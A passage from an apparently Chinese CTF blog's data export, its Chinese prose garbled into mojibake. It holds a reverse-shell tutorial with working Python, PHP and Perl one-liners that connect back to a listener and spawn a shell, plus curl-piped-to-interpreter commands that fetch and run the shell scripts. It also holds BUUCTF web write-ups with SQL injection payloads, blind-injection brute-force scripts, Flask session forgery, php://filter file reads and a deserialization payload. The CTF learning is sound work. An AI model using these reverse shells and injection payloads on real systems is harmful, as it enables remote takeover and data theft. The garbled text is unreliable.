#æ›´æ”¹localhostä¸ºè‡ªå·±çš„ip,ç«¯å£ä»»æ„os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"]) å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œ 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"169.254.158.23\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' æ•ˆæœæ˜¯ä¸€æ ·çš„ å®éªŒ1é¦–å…ˆåœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šå†™ä¸‹pyè„šæœ¬ 123456789#!/usr/bin/python#-*- coding: utf-8 -*-import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"169.254.158.23\",7777)) #æ›´æ”¹localhostä¸ºè‡ªå·±çš„ip,ç«¯å£ä»»æ„os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"]) winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬ 1nc -nvlp 7777 kaliï¼ˆæœåŠ¡ç«¯ï¼‰curl 1curl 192.168.202.129/shell.py|python åå¼¹æˆåŠŸ å®éªŒ2åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬ç«¯å£ 1nc -nvlp 7777 åœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰è¾“å…¥ 1python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39; åå¼¹æˆåŠŸ phpåå¼¹å’Œpythonä¸€æ ·åˆ©ç”¨curl phpè„šæœ¬å¦‚ä¸‹ï¼Œå’Œä¸Šé¢çš„shell.txtä¸€æ ·çš„ 1234&lt;?php$sock=fsockopen(\"169.254.158.23\",7777);//localhostä¸ºè‡ªå·±çš„ipï¼Œç«¯å£ä»»æ„exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; ä¹Ÿå¯ä»¥æ‰§è¡Œ 1php -r '$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' å®éªŒ1é¦–å…ˆåœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰å†™ä¸‹phpè„šæœ¬ï¼Œå­˜ä¸ºshell.txt 1234&lt;?php$sock=fsockopen(\"169.254.158.23\",7777);//localhostä¸ºè‡ªå·±çš„ipï¼Œç«¯å£ä»»æ„exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬ç«¯å£ 1nc -nvlp 7777 kaliï¼ˆæœåŠ¡ç«¯ï¼‰curlåå¼¹ 1curl 192.168.202.129/shell.txt|php åå¼¹æˆåŠŸ å®éªŒ2winä¸Šç›‘å¬ç«¯å£ 1nc -nvlp 7777 kaliä¸Šæ‰§è¡Œ 1php -r '$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' åå¼¹æˆåŠŸ perlåå¼¹å’Œä¸Šé¢å‡ ä¸ªåå¼¹ä¸€æ · è¿™é‡Œåªåšä¸€ä¸‹æ¼”ç¤º 1perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;; å®éªŒåœ¨winä¸Šç›‘å¬ç«¯å£ åœ¨kaliä¸Šæ‰§è¡Œ 1perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;; åå¼¹æˆåŠŸ æ€»ç»“ä»¥ä¸Šéƒ½æ˜¯æœ€åŸºæœ¬çš„åå¼¹shell å…¶å®åå¼¹shellè¿˜æ˜¯å¾ˆçµæ´»çš„ï¼Œå…·ä½“ä»€ä¹ˆæ ·çš„åœºæ™¯ä¸‹æ€ä¹ˆç”¨è¿˜éœ€è¦è‡ªå·±åˆ¤æ–­","categories":[{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"åå¼¹shell","slug":"åå¼¹shell","permalink":"https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"BUUåˆ·é¢˜(Web)","slug":"BUUåˆ·é¢˜","date":"2020-09-27T15:15:28.000Z","updated":"2020-11-20T14:18:05.259Z","comments":true,"path":"2020/09/27/BUUåˆ·é¢˜/","link":"","permalink":"https://pz1o.top/2020/09/27/BUU%E5%88%B7%E9%A2%98/","excerpt":"","text":"BUU(Web)å‰è¨€å…¶å®è‡ªå·±ä¼šåšå®Œé¢˜å†™ä¸€äº›wpï¼Œä½†å¥ˆä½•è‡ªå·±ä¸‰å¤©æ‘¸é±¼ä¸¤å¤©ä¼‘æ¯ï¼Œæ‰€ä»¥ä¸Šä¼ ä¸Šæ¥ç›‘ç£è‡ªå·±å­¦ä¹  é¡ºä¾¿åˆ†ä¸€ä¸‹ç±» SQLæ³¨å…¥[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰ å †å æ³¨å…¥ï¼š åˆ†å·ï¼ˆï¼›ï¼‰æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚ç»“æŸä¸€ä¸ªsqlè¯­å¥å†ç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥ä¸€èµ·æ‰§è¡Œã€‚å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ å…ˆæ¥äº†è§£ä¸€ä¸‹å †å æ³¨å…¥ 1231&#39; #1&#39; order by 2#1&#39; union select 1,2# å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¤§å¤šæ•°è¯­å¥ï¼Œä½†æˆ‘ä»¬è¿˜æœ‰showï¼Œalertï¼Œrenameï¼Œdescç­‰ é€šè¿‡çœ‹è¡¨å¯ä»¥çœ‹è§ä¸¤ä¸ªè¡¨ 11&#39;;desc words;# wordsè¡¨ 11&#39;;desc &#96;1919810931114514&#96;;# &#x2F;&#x2F;åœ¨mysqlä¸­æ•°å­—å‹éœ€è¦&#96;&#96; æ­¤æ—¶ï¼Œæˆ‘ä»¬å°±æ‰¾è§äº†flagï¼Œä½†é—®é¢˜æ˜¯æ€ä¹ˆæ‹¿å‡ºflagå‘¢ï¼Ÿ ä¸‹é¢æ“ä½œæ˜¯éªšå§¿åŠ¿ï¼š ä¸»è¦æ€æƒ³æ˜¯åˆ©ç”¨å›æ˜¾ä½ç½®æ¥å€’é€€è·å–flagï¼Œå›æ˜¾è‚¯å®šæ˜¯idåˆ°wordsè¡¨é‡Œé¢æ‰¾æ•°æ®ï¼Œç„¶åå›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æŸ¥è¯¢è¯­å¥ä¸å˜çš„å‰æä¸‹ï¼Œå°†flagå›æ˜¾å‡ºæ¥ï¼Ÿ æŠŠwordsè¡¨æ”¹åï¼ŒæŠŠæ•°å­—è¡¨æ”¹ä¸ºwordsï¼› å¾€æ–°wordsè¡¨é‡Œé¢æ’å…¥ä¸€ä¸ªidå‚æ•°ï¼Œè¿™æ ·å›æ˜¾å°±å¯ä»¥æ‰¾åˆ°idï¼Œä»è€Œæ˜¾ç¤ºå‡ºflag 1select id,data from words where id&#x3D;&#39;id&#39;; æ‰€ä»¥flagè¿˜å¾—æ”¹æˆdata æœ€ç»ˆpayload 11&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# å¤ä¹ ä¸€ä¸‹mysqlæ“ä½œ 123456#è¡¨é‡å‘½årename table o_name to n_name;#æ–°å¢å­—æ®µalert table table_name add column_name [type];#ä¿®æ”¹å­—æ®µåalert table table_name change o_name n_name [type]; [SUCTF 2019]EasySQLï¼ˆå †å æ³¨å…¥ï¼‰è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†ä¾ç„¶å¯ä»¥å †å æ³¨å…¥ æ‰¾åˆ°Flagè¡¨ ä¹‹åå°±ä¸ä¼šåšäº†â€¦ 12select 1;set sql_mode&#x3D;pipes_as_concat;select 1||flag from Flag; è¡¥å……ç³»ç»Ÿå˜é‡@@sql_modeï¼šæ˜¯ä¸€ç»„mysqlæ”¯æŒçš„åŸºæœ¬è¯­æ³•åŠæ ¡éªŒè§„åˆ™PIPES_AS_CONCATï¼šå°†â€œ||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼ åŸæœ¬||æ˜¯orçš„æ„æ€ï¼Œè¿™é‡Œæ‹¼æ¥ä¹‹åï¼š [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQLç›´æ¥ä¸‡èƒ½å¯†ç ç™»å½• 1admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23 [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQLç®€å•çš„sqlæ³¨å…¥ ç›´æ¥unionæ³¨å…¥ 1231&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)# [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰åŒå†™ç»•è¿‡ æŸ¥å…³é”®å­—å¯ä»¥å…ˆselectè¯­å¥è§‚å¯Ÿå“ªäº›è¢«è¿‡æ»¤äº†ã€‚ å…¶ä¸­å…³é”®å­—æœ‰selectï¼Œunionï¼Œorï¼ˆåŒ…æ‹¬information,passwordï¼‰ï¼Œfromï¼Œwhereï¼Œ 12345671&#39; ununionion selselectect 1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #&#x2F;&#x2F;b4bsql,geekuser1&#39; ununionion selselectect 1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #&#x2F;&#x2F;id username password&#x2F;&#x2F;id username password1&#39; ununionion selselectect 1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125; [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰ç®€å•æµ‹è¯•äº†ä¸€ä¸‹ å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œunionã€andã€orä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå¹¶ä¸”å‘ç°åˆ—æœ‰ä¸¤åˆ—ï¼ŒæŠ¥é”™åªå‡ºboolï¼Œäºæ˜¯å°±æƒ³åˆ°æ˜¯ä¸æ˜¯ç›²æ³¨ï¼Œä½†é¦–è¦é—®é¢˜æ˜¯æ€ä¹ˆç»•è¿‡ç©ºæ ¼ ä»¥ä¸‹æœ‰å‡ ç§ç»•ç©ºæ ¼çš„åŠæ³• /**/ ï¼ˆï¼‰ %0a `` tab è¿™é‡Œæˆ‘ä»¬ç”¨ï¼ˆï¼‰æ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™è„šæœ¬ 1234567891011121314import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"flag = ''for i in range(0,50): for j in dic: payload = \"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)\".format(i,j) data = &#123;\"id\": payload,&#125; r = requests.post(url=url,data=data) if \"Hello\" in r.text: print(payload) flag += j break print(flag) 12æ‹¿åˆ°flagflag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125; ä½†æˆ‘è‡ªå·±å†™çš„è„šæœ¬å¾ˆè¯¡å¼‚ï¼Œæ— æ³•æ£€æµ‹åˆ°-ï¼Œåªèƒ½é€šè¿‡payloadå€’æ¨ æ‰€ä»¥åˆæ¢äº†ä¸€ä¸ªå†™äº†ä¸€ä¸‹,ç”¨asciiå­—ç¬¦æ¥åˆ¤æ–­ 1234567891011121314import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"flag = ''for i in range(1,50): for j in range(32,128): payload = \"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)\".format(i,j); data = &#123;\"id\": payload,&#125; r = requests.post(url=url,data=data) if \"Hello\" in r.text: print(payload) flag += str(chr(j)) break print(flag) åˆšå†™è„šæœ¬ï¼Œå¯¹å…¶ä¸­åŸç†è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå¸Œæœ›åç»­èƒ½æ·±å…¥å­¦ä¹ py ä»£ç å®¡è®¡[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefunç›´æ¥çœ‹æºç  æ‹¿flag 1cat&#x3D;dog [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagä¸»è¦è¯´ä¸€ä¸‹ä¸¤ä¸ªå‡½æ•° strcmp() strcmp()å‡½æ•°åªæœ‰åœ¨ç›¸ç­‰çš„æƒ…å†µä¸‹è¿”å›0ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨äº†== ï¼Œè€ŒNULL==0æ˜¯bool(true)ï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡ã€‚ is_numeric() is_numeric() åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œä¸ä»…æ£€æŸ¥10è¿›åˆ¶ï¼Œ16è¿›åˆ¶ä¹Ÿå¯ä»¥ã€‚is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ï¼è¯¥å‡½æ•°è¿˜å¯èƒ½é€ æˆsqlæ³¨å…¥ï¼Œä¾‹å¦‚å°†â€˜1 or 1â€™è½¬æ¢ä¸º16è¿›åˆ¶å½¢å¼ï¼Œå†ä¼ å‚ï¼Œå°±å¯ä»¥é€ æˆsqlæ³¨å…¥ ä¹‹åå°±æ˜¯æ”¹cookieï¼Œpostè¿›passwordå’Œmoney è¿™é‡Œåˆ¤æ–­moneyç›¸ç­‰ç”¨çš„æ˜¯strcmp()æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ [BJDCTF2020]Easy MD5ï¼ˆffifdyopï¼‰å‘äº†å‡ ä¸ªæ•°å­—åæ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åæŠ“åŒ…ï¼Œçœ‹è§hint 1select * from &#39;admin&#39; where password&#x3D;md5($pass,true) è¿™é‡Œæƒ³è¦ç»•è¿‡çš„è¯è‚¯å®šæ˜¯æ‰¾ä¸‡èƒ½å¯†ç  1password&#x3D;&#39;&#39; or &#39;123&#39; è¿™é‡Œçš„è¯ç”¨çš„æ˜¯ffifdyopMD5åŠ å¯†åä¸º 1&#39;or&#39;6Ã‰]â„¢Ã©!r,Ã¹Ã­b\u001c ç¬¦åˆä¸‡èƒ½å¯†ç  è¿›å…¥ä¸‹ä¸€å…³ æºç å¦‚ä¸‹ 12345$a &#x3D; $GET[&#39;a&#39;];$b &#x3D; $_GET[&#39;b&#39;];if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123; &#x2F;&#x2F; wow, glzjin wants a girl friend. è¿™ä¸ªå¯ä»¥æ‹¿æ•°ç»„è¿‡ï¼Œä¹Ÿå¯ä»¥æ‰¾ä¸€äº›ç‰¹æ®Šçš„å¦‚ 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a ä»–ä»¬çš„MD5éƒ½æ˜¯0 æœ€åä¸€å…³æºç  123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123; echo $flag;&#125; ç›´æ¥æ‹¿æ•°ç»„ç»•è¿‡å°±å¥½ å¼€å‘[æŠ¤ç½‘æ¯ 2018]easy_tornadoå­¦ä¹ ä¸€ä¸‹tornado https://blog.csdn.net/belalds/article/details/80575755 1234567891011121314151617# coding:utf-8 import tornado.webimport tornado.ioloop class IndexHandler(tornado.web.RequestHandler): \"\"\"ä¸»è·¯ç”±å¤„ç†ç±»\"\"\" def get(self): \"\"\"å¯¹åº”httpçš„getè¯·æ±‚æ–¹å¼\"\"\" self.write(\"Hello Itcast!\") if __name__ == \"__main__\": app = tornado.web.Application([ (r\"/\", IndexHandler), ]) app.listen(8000) tornado.ioloop.IOLoop.current().start() tornado.web tornadoçš„åŸºç¡€webæ¡†æ¶æ¨¡å— RequestHandler å°è£…äº†å¯¹åº”ä¸€ä¸ªè¯·æ±‚çš„æ‰€æœ‰ä¿¡æ¯å’Œæ–¹æ³•ï¼Œwrite(å“åº”ä¿¡æ¯)å°±æ˜¯å†™å“åº”ä¿¡æ¯çš„ä¸€ä¸ªæ–¹æ³•ï¼›å¯¹åº”æ¯ä¸€ç§httpè¯·æ±‚æ–¹å¼ï¼ˆgetã€postç­‰ï¼‰ï¼ŒæŠŠå¯¹åº”çš„å¤„ç†é€»è¾‘å†™è¿›åŒåçš„æˆå‘˜æ–¹æ³•ä¸­ï¼ˆå¦‚å¯¹åº”getè¯·æ±‚æ–¹å¼ï¼Œå°±å°†å¯¹åº”çš„å¤„ç†é€»è¾‘å†™åœ¨get()æ–¹æ³•ä¸­ï¼‰ï¼Œå½“æ²¡æœ‰å¯¹åº”è¯·æ±‚æ–¹å¼çš„æˆå‘˜æ–¹æ³•æ—¶ï¼Œä¼šè¿”å›â€œ405: Method Not Allowedâ€é”™è¯¯ã€‚ 1234567891011121314151617# coding:utf-8 import tornado.webimport tornado.ioloop class IndexHandler(tornado.web.RequestHandler): \"\"\"ä¸»è·¯ç”±å¤„ç†ç±»\"\"\" def post(self): # æˆ‘ä»¬ä¿®æ”¹äº†è¿™é‡Œ \"\"\"å¯¹åº”httpçš„postè¯·æ±‚æ–¹å¼\"\"\" self.write(\"Hello Itcast!\") if __name__ == \"__main__\": app = tornado.web.Application([ (r\"/\", IndexHandler), ]) app.listen(8000) tornado.ioloop.IOLoop.current().start() Application Tornado Webæ¡†æ¶çš„æ ¸å¿ƒåº”ç”¨ç±»ï¼Œæ˜¯ä¸æœåŠ¡å™¨å¯¹æ¥çš„æ¥å£ï¼Œé‡Œé¢ä¿å­˜äº†è·¯ç”±ä¿¡æ¯è¡¨ï¼Œå…¶åˆå§‹åŒ–æ¥æ”¶çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªè·¯ç”±ä¿¡æ¯æ˜ å°„å…ƒç»„çš„åˆ—è¡¨ï¼›å…¶listen(ç«¯å£)æ–¹æ³•ç”¨æ¥åˆ›å»ºä¸€ä¸ªhttpæœåŠ¡å™¨å®ä¾‹ï¼Œå¹¶ç»‘å®šåˆ°ç»™å®šç«¯å£ï¼ˆæ³¨æ„ï¼šæ­¤æ—¶æœåŠ¡å™¨å¹¶æœªå¼€å¯ç›‘å¬ï¼‰ã€‚ æ€»ç»“Tornado Webç¨‹åºç¼–å†™æ€è·¯ åˆ›å»ºwebåº”ç”¨å®ä¾‹å¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªåˆå§‹åŒ–å‚æ•°ä¸ºè·¯ç”±æ˜ å°„åˆ—è¡¨ã€‚ å®šä¹‰å®ç°è·¯ç”±æ˜ å°„åˆ—è¡¨ä¸­çš„handlerç±»ã€‚ åˆ›å»ºæœåŠ¡å™¨å®ä¾‹ï¼Œç»‘å®šæœåŠ¡å™¨ç«¯å£ã€‚ å¯åŠ¨å½“å‰çº¿ç¨‹çš„IOLoopã€‚ [HCTF 2018]adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰å‘ç°åªèƒ½adminæ‰èƒ½ç™»å½•è·å–flag ä¸»è¦å­¦ä¹ ä¸€ä¸‹flaskä¸­çš„sessionä¼ªé€  sessionä¸€èˆ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œè€Œåœ¨flaskä¸­ï¼Œsessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”flaskä¸­å¯¹æ•°æ®ä»…ä»…è¿›è¡Œäº†ç­¾åï¼Œç­¾åä¸»è¦ç›®çš„æ˜¯é˜²æ­¢ç¯¡æ”¹ï¼Œä½†å´æ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚æ‰€ä»¥å°±ä¼šäº§ç”Ÿä¸€äº›å®‰å…¨é—®é¢˜ã€‚ åœ¨è¿™ä¸ªé¢˜ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªæ¥è§£é¢˜ å…ˆæ¥çœ‹ä¸€ä¸‹è‡ªå·±æ³¨å†Œç”¨æˆ·testçš„cookieï¼Œä¹‹åè¿›è¡Œè§£ç ï¼Œå¯ä»¥å‚è€ƒpç‰›çš„è„šæœ¬ï¼Œä¹Ÿå¯ä»¥ä¸Šgithubä¸Šæ‰¾flask-session-managerä¹‹ådoneä¸‹æ¥ æˆ‘è¿™é‡Œç”¨çš„æ˜¯python2.7 è§£å¯†:python flask_session_manager2.py decode -c -s # -cæ˜¯flask cookieé‡Œçš„sessionå€¼ -så‚æ•°æ˜¯SECRET_KEY åŠ å¯†:python flask_session_manager2.py encode -s -t # -så‚æ•°æ˜¯SECRET_KEY -tå‚æ•°æ˜¯sessionçš„å‚ç…§æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯sessionè§£å¯†åçš„æ ¼å¼ 12.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125; 1.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs ä¹‹åè¿›è¡Œæ”¹å¯†ç ç™»å½•å°±å¯ä»¥ã€‚ æ–‡ä»¶åŒ…å«[æå®¢å¤§æŒ‘æˆ˜ 2019]Secretä¸€ç›´æŸ¥çœ‹æºç æœ€ååªéœ€è¦ç”¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«å°±å¯ä»¥è¯»å‡ºflag 12?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php [ACTF2020 æ–°ç”Ÿèµ›]Includeç›´æ¥è¯»å–flag.php 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php PHPååºåˆ—åŒ–[æå®¢å¤§æŒ‘æˆ˜ 2019]PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰è€ƒå¯Ÿphpååºåˆ—åŒ–ï¼Œå…ˆä¸‹è½½www.zipé‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰class.phpï¼Œindex.phpï¼Œflag.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123; private $username &#x3D; &#39;nonono&#39;; private $password &#x3D; &#39;yesyes&#39;; public function __construct($username,$password)&#123; $this-&gt;username &#x3D; $username; $this-&gt;password &#x3D; $password; &#125; function __wakeup()&#123; $this-&gt;username &#x3D; &#39;guest&#39;; &#125; function __destruct()&#123; if ($this-&gt;password !&#x3D; 100) &#123; echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;; die(); &#125; if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; å…¶ä¸­é€»è¾‘å°±æ˜¯å¯†ç ä¸º100ï¼Œå¹¶ä¸”username=â€™adminâ€˜ 12345678class Name&#123; private $username = \"admin\"; private $password = \"100\";&#125;$a = new Name();$a = serialize($a); echo urlencode($a);//O:4:\"Name\":3:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";s:3:\"100\";&#125; 